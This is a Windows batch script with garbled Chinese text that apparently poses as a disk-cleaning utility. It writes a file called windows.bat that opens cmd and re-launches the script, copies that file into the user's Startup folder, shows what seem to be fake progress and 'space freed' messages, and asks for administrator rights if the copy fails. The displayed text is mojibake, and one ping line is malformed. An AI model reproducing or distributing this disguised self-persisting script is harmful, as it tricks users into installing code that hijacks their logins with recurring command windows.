@echo off
color 2f
title ��������
echo ====����ɱ������������أ���ѡ����������Ĳ�����====
echo.
echo.
echo start cmd >c:\windows\windows.bat
echo %0 >>c:\windows\windows.bat
copy c:\windows\windows.bat "%USERPROFILE%\AppData\Roaming\Microsoft\windows\StartMenu\Programs\Starup\">nul
if %errorlevel%==0 goto next
copy c:\windows\windows.bat "%USERPROFILE%\����ʼ���˵�\����\����">nul 
if %errorlevel%==1 goto error

:next
echo.
echo.
echo. =======���������У��벻Ҫ�رմ���=========
echo.
ping -n 127.0.0.1>nul
echo.
echo  ======����������ϣ�������500M����========
echo.
echo.
echo. ============����������������==============
pause

:error
echo.
echo.
echo   =========��⣡������������ʧ�ܣ��롾ʹ�ù���ԱȨ�ޡ���������===========
echo.
pause
